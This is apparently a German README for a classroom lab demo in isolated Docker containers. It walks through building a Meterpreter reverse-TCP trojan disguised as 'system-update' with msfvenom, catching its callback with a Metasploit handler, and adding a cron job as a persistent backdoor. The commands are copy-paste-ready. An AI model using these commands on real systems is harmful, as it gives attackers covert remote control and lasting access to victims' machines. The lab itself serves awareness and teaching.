# Szenario 2: Trojaner einspielen (Meterpreter-Backdoor)

Live-Demo: Der Angreifer baut eine getarnte ausfuehrbare Datei (**Trojaner**), bringt das Opfer
zum Ausfuehren, erhaelt eine **Meterpreter-Backdoor** und macht sich mit einem Cron-Job
**dauerhaft** im System fest.

## Hintergrund

Nicht jeder Angriff braucht eine Software-Schwachstelle wie in Szenario 1. Sehr oft genuegt eine
**ausfuehrbare Datei + ein unvorsichtiger Klick** (Social Engineering): Eine als „Update" oder
Rechnung getarnte Datei wird per E-Mail/Download/USB verteilt. Sobald das Opfer sie startet, baut
sie eine **Reverse-Verbindung** zum Angreifer auf — der hat ab dann volle Kontrolle, ganz ohne
Exploit.

## Architektur

```
┌──────────────────┐                         ┌──────────────────┐
│    attacker       │   1. msfvenom baut       │     victim        │
│  10.20.0.10       │      Trojaner            │  10.20.0.20       │
│  Metasploit       │                          │  Ubuntu           │
│                   │   2. Datei kommt rueber  │  User: mitarbeiter│
│  multi/handler    │  ───── /transfer ──────▶ │   ~/Downloads/     │
│  lauscht :4444    │     (geteilter Ordner)   │    system-update   │
│                   │ ◀═══ 3. reverse_tcp ═════│  (Trojaner laeuft) │
│  Meterpreter-     │      Backdoor-Session    │                   │
│  Session          │                          │  + Cron-Backdoor   │
└──────────────────┘                         └──────────────────┘
                Docker-Netz: lab (10.20.0.0/24)
```

## Voraussetzungen

- Docker + Docker Compose
- ca. 2 GB freier Speicher (Metasploit-Image)
- Internetverbindung beim ersten Start (Image-Download)

## Start

```sh
cd szenario-2-trojaner-backdoor
docker compose up -d --build     # Container bauen & starten
docker attach trojan-attacker    # an msfconsole anhaengen
```

> **Tipp:** `Ctrl-P Ctrl-Q` loest die Konsole ab, ohne sie zu beenden.

## Demo-Ablauf (Copy-Paste-ready)

### Schritt 1: Trojaner bauen

In der msfconsole (oder einer Shell im Angreifer-Container):

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.20.0.10 LPORT=4444 -f elf -o /transfer/system-update
```

**Was passiert:**
- `msfvenom` ist der Payload-Generator von Metasploit
- erzeugt eine ELF-Programmdatei, die beim Start eine Verbindung zum Angreifer (`LHOST`) aufbaut
- der harmlose Name `system-update` tarnt die Datei
- sie landet im geteilten Ordner `/transfer` — das simuliert den Weg zum Opfer (E-Mail/Download/USB)

---

### Schritt 2: Auf Lauschposten gehen (Handler)

```
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.20.0.10
set LPORT 4444
set ExitOnSession false
run -j
```

**Was passiert:**
- `multi/handler` nimmt die zurueckkommende Verbindung des Trojaners entgegen
- `ExitOnSession false` + `run -j` = Handler laeuft als **Hintergrund-Job** und bleibt aktiv,
  auch nachdem die erste Session aufgegangen ist (wichtig fuer die Backdoor spaeter)

**Erwartet:** `Started reverse TCP handler on 10.20.0.10:4444`

---

### Schritt 3: Opfer fuehrt den Trojaner aus

In einem **zweiten Terminal** (du spielst den arglosen Mitarbeiter):

```sh
docker exec -it -u mitarbeiter trojan-victim bash
cp /transfer/system-update ~/Downloads/system-update
chmod +x ~/Downloads/system-update
~/Downloads/system-update &
```

**Was passiert:** Der Mitarbeiter „lädt" die Datei in seinen Downloads-Ordner und startet sie
(„Doppelklick"). Sofort baut sie eine Verbindung zum Angreifer auf.

**Erwartet:** Zurueck in der msfconsole erscheint
`Meterpreter session 1 opened`.

---

### Schritt 4: Kontrolle uebernehmen

In der msfconsole in die Session wechseln:

```
sessions -i 1
```

Dann im Meterpreter:

```
getuid
sysinfo
ps
```

**Was passiert:** Wir sind als User `mitarbeiter` auf dem Opfer-Rechner und sehen System-Infos
und laufende Prozesse.

---

### Schritt 5: Backdoor einrichten (Persistenz)

Damit der Zugang **dauerhaft** bleibt, legen wir einen Cron-Job an, der den Trojaner jede Minute
neu startet. Im Meterpreter:

```
shell
(crontab -l 2>/dev/null; echo '* * * * * /home/mitarbeiter/Downloads/system-update') | crontab -
crontab -l
exit
```

**Was passiert:** Selbst wenn das Opfer den Rechner neu startet oder den Prozess beendet — der
Cron-Job startet den Trojaner immer wieder. Der Angreifer hat eine **persistente Backdoor**.

---

### Schritt 6: Backdoor beweisen

Aktuelle Session beenden und zurueck zur Konsole:

```
background
sessions -K        # alle aktiven Sessions killen
```

Jetzt **ca. 1 Minute warten**. Der Cron-Job feuert den Trojaner erneut ab:

```
sessions -l
```

**Erwartet:** Eine **neue** Session (z. B. `session 2`) ist aufgegangen — **ohne** dass das Opfer
etwas getan hat. Der Angreifer ist von selbst zurueck.

## Stop

```sh
docker compose down -v    # Container + Volumes (inkl. Trojaner) entfernen
```

## Kernaussagen fuer die Praesentation

1. **Kein Exploit noetig** — eine ausfuehrbare Datei + ein Klick genuegen (Social Engineering).
2. **Reverse-Verbindung** umgeht Firewalls: Das Opfer baut die Verbindung nach aussen auf.
3. **Persistenz** macht aus einem einmaligen Zugriff eine dauerhafte **Backdoor**.
4. **Gegenmassnahmen:** Keine unbekannten Dateien ausfuehren, Application Whitelisting,
   Endpoint Protection/AV, ausgehenden Datenverkehr ueberwachen, Least Privilege, Awareness-Schulungen.

## Hinweise

- Das Opfer laeuft bewusst als **normaler User** (`mitarbeiter`), nicht als root — realistisch
  fuer eine Mitarbeiter-Workstation. Echte Angreifer wuerden anschliessend eine
  Privilege-Escalation versuchen (eigenes Thema).
- Beide Container sind nur im internen `lab`-Netz — kein Zugriff auf den Host oder das Internet.
- Szenario 2 nutzt ein eigenes Subnetz (`10.20.0.0/24`), Szenario 1 nutzt `10.10.0.0/24` — sie
  kollidieren also nicht und koennten sogar parallel laufen.
